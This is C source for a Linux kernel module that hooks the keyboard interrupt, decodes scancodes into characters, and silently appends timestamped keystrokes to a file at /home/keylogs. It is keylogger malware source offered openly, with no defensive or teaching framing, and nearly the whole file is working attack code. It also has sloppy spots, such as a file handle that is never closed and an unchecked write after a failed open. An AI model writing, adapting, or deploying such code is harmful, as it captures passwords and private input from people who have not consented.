#include <linux/ktime.h>
#include <linux/init.h>           /* Macros used to mark up functions e.g. __init __exit */
#include <linux/module.h>         /* Core header for loading LKMs into the kernel */
#include <linux/kernel.h>         /* Contains types, macros, functions for the kernel */
#include <linux/sched.h>
#include <linux/workqueue.h>
#include <linux/slab.h>           /* kmalloc */
#include <linux/interrupt.h>	  /* We want an interrupt */
#include <asm/io.h>
#include <linux/fs.h>


#define MY_WORK_QUEUE_NAME "WQ_irq"
static struct workqueue_struct *my_workqueue = NULL;

static char *key_names[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", " delete ", "	",
                        "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "", "", "a", "s", "d", "f",
                        "g", "h", "j", "k", "l", ";", "'", "`", "", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",
                        "/", "", "\0", "\0", " ", "", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
                        "_F8_", "_F9_", "_F10_", "", "", "", "", "", "-", "", "5",
                        "", "=", "", "", "", "", "", "\0", "\0", "\0", "_F11_", "_F12_",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "", "", "/", "", "", "\0", "",
                        "", "", "", "", "", "", "", "", "", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", ""};

static char *key_names_caps[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", " delete ", "	",
                        "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "", "", "A", "S", "D", "F",
                        "G", "H", "J", "K", "L", ";", "'", "`", "", "\\", "Z", "X", "C", "V", "B", "N", "M", ",", ".",
                        "?", "", "\0", "\0", " ", "", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
                        "_F8_", "_F9_", "_F10_", "", "", "", "", "", "-", "", "5",
                        "", "=", "", "", "", "", "", "\0", "\0", "\0", "_F11_", "_F12_",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "", "", "/", "", "", "\0", "",
                        "", "", "", "", "", "", "", "", "", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", ""};

static char *key_names_shift[] = { "\0", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", " delete ", "	",
                        "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "", "", "A", "S", "D", "F",
                        "G", "H", "J", "K", "L", ":", "\"", "~", "", "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">",
                        "?", "", "\0", "\0", " ", "", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
                        "_F8_", "_F9_", "_F10_", "", "", "", "", "", "-", "", "5",
                        "", "+", "", "", "", "", "", "\0", "\0", "\0", "_F11_", "_F12_",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "", "", "?", "", "", "\0", "",
                        "", "", "", "", "", "", "", "", "", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", ""};



// Workqueue Structure
typedef struct {
    struct work_struct w;
    unsigned char scancode;
} irq_task_t;

irq_task_t *work;


/**
 * This will get called by the kernel as soon as it's safe to do everything normally allowed by kernel modules.
 */
static void got_char(struct work_struct *w) {

  /* Get the main pointer */
  irq_task_t *work = container_of(w, irq_task_t, w);

  /* Get scancode and the release state */
  int scancode = work->scancode & 0x7F;
  char released = work->scancode & 0x80 ? 1 : 0;

  static char buff[100], data_buff[200], key_buff[100];
  static char keystrokes[1000];

  static int caps_lock  = 0;
  static int shiftDown = 0 ;

  //time
  struct timeval t;
  struct tm broken;
  do_gettimeofday(&t);
  time_to_tm(t.tv_sec, 0, &broken);
  //printk("%d:%d:%d:%ld  %d  %d  %ld\n", (broken.tm_hour+4), broken.tm_min, broken.tm_sec, t.tv_usec, broken.tm_mday, broken.tm_mon, (broken.tm_year + 1900)); 

  // File Operations
  struct file *fp;
  mm_segment_t fs;
  loff_t offset = 0;
  char *filename = "/home/keylogs";

  fs = get_fs(); 
    set_fs(KERNEL_DS);
    fp = filp_open(filename, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (IS_ERR(fp)) {
        printk(KERN_ERR "Can't open file %s\n", filename);
    }
  
  if (scancode < 112) {
	  if (!released) {
		char **arr;

		if(scancode == 0x2a){
			shiftDown=1;
		}

		if(shiftDown == 1){
			arr = key_names_shift;
		}

		if(scancode == 0x3a){
			if (caps_lock == 0) {
				caps_lock = 1;
			}else if (caps_lock == 1){
				caps_lock = 0;
			}
		}
		
		 if (caps_lock == 1) {
		        arr = key_names_caps;
		  } else if (caps_lock == 0 && shiftDown==0){
			arr = key_names;
		  }

		snprintf(key_buff, 8, "%s", arr[scancode]);
		strcat(keystrokes, key_buff);

		if(scancode == 0x1c){
			//Date
			strcpy(buff, "");
			snprintf(buff, 8, "%d", broken.tm_mon);
			strcat(data_buff, buff);
			snprintf(buff, 8, "%s", "/");
			strcat(data_buff, buff);
			snprintf(buff, 8, "%d", broken.tm_mday);
			strcat(data_buff, buff);
			snprintf(buff, 8, "%s", "/");
			strcat(data_buff, buff);
			snprintf(buff, 8, "%ld",(broken.tm_year + 1900));
			strcat(data_buff, buff);
			snprintf(buff, 8, "%s", ":");
			strcat(data_buff, buff);
			//Time
			snprintf(buff, 8, "%d",(broken.tm_hour+4));
			strcat(data_buff, buff);
			snprintf(buff, 8, "%s", ":");
			strcat(data_buff, buff);
			snprintf(buff, 8, "%d",broken.tm_min);
			strcat(data_buff, buff);
			snprintf(buff, 8, "%s", ":");
			strcat(data_buff, buff);
			snprintf(buff, 8, "%d",broken.tm_sec);
			strcat(data_buff, buff);
			snprintf(buff, 8, "%s", " -");
			strcat(data_buff, buff);

			vfs_write(fp, data_buff, strlen(data_buff), &offset);

			snprintf(key_buff, 8, "%s", "\n");
			strcat(keystrokes, key_buff);

			vfs_write(fp, keystrokes, strlen(keystrokes), &offset);
			memset(keystrokes, 0, strlen(keystrokes));
			memset(buff, 0, strlen(buff));
			memset(data_buff, 0, strlen(data_buff));
		}

		printk(KERN_INFO "Scan Code %x %s.\n",
			 scancode, released ? "Released" : "Pressed");
   	  }
	if(released && scancode == 0x2a){
			shiftDown=0;
	}
  }
}

/*
            * This function services keyboard interrupts. It reads the relevant
            * information from the keyboard and then puts the non time critical
            * part into the work queue. This will be run when the kernel considers it safe.
            */

irqreturn_t irq_handler(int irq, void *dev_id) {
  static unsigned char scancode;
  unsigned char status;

  /* Read keyboard status */
  status = inb(0x64);
  scancode = inb(0x60);
  /* Write the new value */
  work->scancode = scancode;
  /* Queue new work */
  queue_work(my_workqueue, &work->w);
  return IRQ_HANDLED;
}

    /*
            * Initialize the module - register the IRQ handler
            */


static int __init irq_init_module(void) {

  my_workqueue = create_workqueue(MY_WORK_QUEUE_NAME);
  work = (irq_task_t *)kmalloc(sizeof(irq_task_t), GFP_KERNEL);
  if (work) {
    INIT_WORK(&work->w, got_char);
  }
  /*
   * Request IRQ 1 (keyboard IRQ), and register the callback function to the associated IRQ handler.
   * SA_SHIRQ: Means we're willing to have other handlers on this IRQ.
   * SA_INTERRUPT: Can be used to make the handler into a fast interrupt.
   */
  return request_irq(1, /* The number of the keyboard IRQ on PCs */
		     irq_handler, /* module handler */
		     IRQF_SHARED, /* Means we're willing to have other handlers on this IRQ. */
		     "irq_handler", /* Shortname displayed into  /proc/interrupts. */
		     (void*)work); /* This parameter can point to anything but it shouldn't be NULL, 
						finally it's important to pass the same pointer value to the free_irq function. */
}


/**
 * @brief The LKM cleanup function.
 */
static void __exit irq_exit_module(void) {  
  /* cleanup workqueue resources */
  flush_workqueue(my_workqueue);
  destroy_workqueue(my_workqueue);
  kfree((void *)work);
  /*
            * This is only here for completeness. It's totally irrelevant, since
            * we don't have a way to restore the normal keyboard interrupt so the
            * computer is completely useless and has to be rebooted.
            */

  free_irq(1, NULL);
}
module_init(irq_init_module);
module_exit(irq_exit_module);

/* some work_queue related functions are just available to GPL licensed Modules */
MODULE_LICENSE("GPL");
MODULE_VERSION("1.0");


